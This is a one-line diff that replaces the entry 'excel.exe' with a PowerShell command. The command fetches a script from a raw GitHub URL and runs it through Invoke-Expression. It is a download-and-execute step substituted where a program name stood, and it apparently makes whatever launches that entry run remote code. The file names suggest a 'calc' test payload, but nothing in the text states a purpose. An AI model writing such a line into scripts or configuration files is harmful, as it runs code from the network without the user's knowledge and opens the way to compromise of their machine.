@@ -1,1 +1,1 @@
-excel.exe
+$script = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Lorcan84/test/main/calc" -UseBasicParsing; Invoke-Expression $script.Content
